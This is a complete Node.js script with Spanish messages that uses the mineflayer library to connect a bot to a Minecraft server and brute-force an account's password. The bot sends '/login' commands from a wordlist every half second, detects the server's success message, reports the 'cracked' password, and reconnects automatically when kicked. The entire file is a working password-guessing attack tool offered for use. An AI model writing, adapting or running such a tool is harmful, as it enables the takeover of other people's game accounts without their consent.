const mineflayer = require('mineflayer');
const fs = require('fs');
const readline = require('readline');

const GRAY = '\x1b[37m';
const RED = '\x1b[31m';
const GREEN = '\x1b[32m';
const WHITE = '\x1b[97m';

const [,, username, host, port, version] = process.argv;

if (!username || !host || !port || !version) {
    console.log('Uso: node Bot.js <nick> <ip> <puerto> <version>');
    process.exit(1);
}

let passwords = [];
let currentIndex = 0;
let wordlistTerminada = false;
let mensajeEnviado = false;
let fuerzaBrutaDetenida = false;

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function cargarPasswords() {
    try {
        const data = fs.readFileSync('login/list.txt', 'utf8');
        passwords = data.split('\n').map(p => p.trim()).filter(p => p);
    } catch (err) {
        console.error('Error al leer el archivo de contraseñas:', err);
        process.exit(1);
    }
}

function leerMensaje() {
    try {
        const mensaje = fs.readFileSync('msg/mensaje.txt', 'utf8');
        return mensaje.trim();
    } catch (err) {
        console.error('❌ Error al leer el mensaje:', err);
        return null;
    }
}

function crearBot() {
    const bot = mineflayer.createBot({
        username,
        host,
        port: parseInt(port),
        version
    });

    bot.on('login', () => {
        console.log(`🎮 Conectado como ${username}`);
    });

    bot.on('spawn', () => {
        console.log('🌍 El bot se ha unido al servidor');
        if (!wordlistTerminada && !fuerzaBrutaDetenida) intentarLogin(bot);
    });

    bot.on('end', () => {
        console.log('❌ El bot se ha desconectado. Reconectando...');
        setTimeout(crearBot, 3000);
    });

    bot.on('error', err => {
        if (!err.message.includes('Ignoring block entities as chunk failed to load')) {
            console.error('🚨 Error:', err);
        }
    });

    bot.on('message', (message) => {
        const texto = message.toString();
        const mensajeEsperado = leerMensaje();

        if (mensajeEsperado && texto.includes(mensajeEsperado) && !mensajeEnviado) {
            console.log('')
            console.log(`🔑 Password ${RED}crackeada: ${GREEN}${passwords[currentIndex - 1]} ${WHITE}`);
            console.log('')
            mensajeEnviado = true;
            wordlistTerminada = true;
        }
    });

    rl.on('line', (input) => {
        if (input === '.clear') {
            console.clear();
            console.log('Consola limpiada!');
        }
        if (input === '.restartlist') {
            console.log('🔄 Reiniciando la lista de contraseñas...');
            currentIndex = 0;
            wordlistTerminada = false;
            mensajeEnviado = false;
            intentarLogin(bot);
        }
        if (input.startsWith('.passlist ')) {
            const num = parseInt(input.split(' ')[1]);
            if (!isNaN(num) && num > 0 && num <= passwords.length) {
                console.log(`🔑 Comenzando desde la contraseña número ${num}...`);
                currentIndex = num - 1;
                wordlistTerminada = false;
                mensajeEnviado = false;
                intentarLogin(bot);
            } else {
                console.log('❌ El número proporcionado no es válido.');
            }
        }
        if (input === '.help') {
            console.log(`
Comandos disponibles:
${GRAY}[${RED}#${GRAY}] .restartlist - Vuelves a comenzar la fuerza bruta desde cero
${GRAY}[${RED}#${GRAY}] .passlist <numero> - Comienza desde la contraseña especificada en la wordlist
${GRAY}[${RED}#${GRAY}] .stop - Detiene la fuerza bruta
${GRAY}[${RED}#${GRAY}] .start - Inicia la fuerza bruta
${GRAY}[${RED}#${GRAY}] .help - Muestra el mensaje de ayuda
${GRAY}[${RED}#${GRAY}] .clear - Limpia la consola
            `);
        }
        if (input === '.stop') {
            console.log('🚫 Fuerza bruta detenida');
            fuerzaBrutaDetenida = true;
        }
        if (input === '.start') {
            console.log('🔄 Reiniciando la fuerza bruta...');
            fuerzaBrutaDetenida = false;
            intentarLogin(bot);
        }
    });
}

function intentarLogin(bot) {
    if (currentIndex >= passwords.length || wordlistTerminada || fuerzaBrutaDetenida) {
        console.log('✅ Se ha probado toda la wordlist o el proceso ha sido detenido.');
        return;
    }

    const password = passwords[currentIndex];
    const totalPasswords = passwords.length;

    const percentage = Math.floor(((currentIndex + 1) / totalPasswords) * 100);

    console.clear();
    console.log(`🔑 Se esta intentando ${RED}Crackear ${WHITE}la password`);
    console.log(`⚙️ Probando contraseña (${currentIndex + 1}/${totalPasswords}) ${GREEN}${percentage}% ${WHITE}`);

    bot.chat(`/login ${password}`);
    
    currentIndex++;
    setTimeout(() => intentarLogin(bot), 500);
}

cargarPasswords();
crearBot();
